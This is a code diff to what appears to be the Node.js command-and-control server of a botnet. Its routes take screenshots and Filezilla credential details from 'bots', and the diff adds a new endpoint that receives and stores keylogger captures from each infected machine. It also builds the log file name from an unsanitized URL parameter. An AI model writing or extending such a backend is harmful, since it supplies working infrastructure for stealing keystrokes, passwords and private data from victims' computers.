@@ -1,9 +1,10 @@
+const fs = require("fs");
 const multer = require("multer");
 const db = require("../../models");
 const ip = require("../../library/ip.js");
 const v = require("../../library/verifier.js");
 
-const storage = multer.diskStorage({
+const image_storage = multer.diskStorage({
     destination: (req, file, cb) => {
         cb(null, "./server/images");
     },
@@ -12,7 +13,17 @@ const storage = multer.diskStorage({
     },
 });
 
-const upload = multer({ storage: storage });
+const log_storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        cb(null, "./server/logs");
+    },
+    filename: (req, file, cb) => {
+        cb(null, req.params.identifier + ".txt");
+    },
+});
+
+const image_upload = multer({ storage: image_storage });
+const log_upload = multer({ storage: log_storage });
 
 module.exports = (application) => {
     application.post("/update/details/:identifier/:token", async (req, res) => {
@@ -96,7 +107,7 @@ module.exports = (application) => {
 
     application.post(
         "/update/screenshot/:identifier/:token",
-        upload.single("file"),
+        image_upload.single("file"),
         async (req, res) => {
             const { identifier, token } = req.params;
             if (identifier && token) {
@@ -349,6 +360,53 @@ module.exports = (application) => {
                                 res.status(200).json({
                                     message: "Filezilla details created",
                                 });
+                            });
+                        }
+                    });
+                } else {
+                    res.status(401).json({
+                        message: "Bot not found or token/id is invalid",
+                    });
+                }
+            } else {
+                res.status(403).json({
+                    message: "Missing token/id or not enough POST fields",
+                });
+            }
+        }
+    );
+
+    application.post(
+        "/update/keylogger/:identifier/:token",
+        log_upload.single("file"),
+        async (req, res) => {
+            const { identifier, token } = req.params;
+            if (identifier && token) {
+                const verify = await v.validate(identifier, token);
+                if (verify) {
+                    db.Bots.findAll({
+                        where: {
+                            identifier: identifier,
+                        },
+                    }).then((results) => {
+                        if (results.length > 0 && results[0].logSize) {
+                            db.Bots.update(
+                                {
+                                    logSize: fs.statSync("./server/logs/" + identifier + ".txt").size / 1000000 + "MB"
+                                },
+                                {
+                                    where: {
+                                        identifier: identifier,
+                                    },
+                                }
+                            ).then(() => {
+                                res.status(200).json({
+                                    message: "Upload OK",
+                                });
+                            });
+                        } else {
+                            res.status(200).json({
+                                message: "Upload OK",
                             });
                         }
                     });
